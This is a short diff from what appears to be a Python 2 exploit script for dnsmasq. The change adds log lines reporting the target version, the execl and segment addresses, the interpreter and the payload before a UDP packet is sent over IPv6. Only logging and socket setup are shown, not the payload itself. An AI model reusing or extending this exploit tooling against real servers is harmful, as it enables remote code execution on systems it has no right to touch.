@@ -195,7 +195,16 @@ else:
 
 
 def send_packet(data, host, port):
-    print Base.c_info + "Sending " + str(len(data)) + " bytes to " + str(host) + ":" + str(port)
+    print Base.c_info + "Capacity: " + capacity
+    print Base.c_info + "Dnsmasq version: " + dnsmasq_version
+    print Base.c_info + "Interpreter: " + interpreter
+    print Base.c_info + "Interpreter arg: " + interpreter_arg
+    print Base.c_info + "Payload: " + payload
+    print Base.c_info + "Address segment .text: " + str(TEXT[capacity][dnsmasq_version])
+    print Base.c_info + "Address segment .data: " + str(DATA[capacity][dnsmasq_version])
+    print Base.c_info + "Address execl function: " + str(EXECL[capacity][dnsmasq_version])
+
+    print Base.c_success + "Sending " + str(len(data)) + " bytes to " + str(host) + ":" + str(port)
     sock = socket(AF_INET6, SOCK_DGRAM, IPPROTO_UDP)
 
     sock.setsockopt(SOL_SOCKET, SO_SNDBUF, len(data))
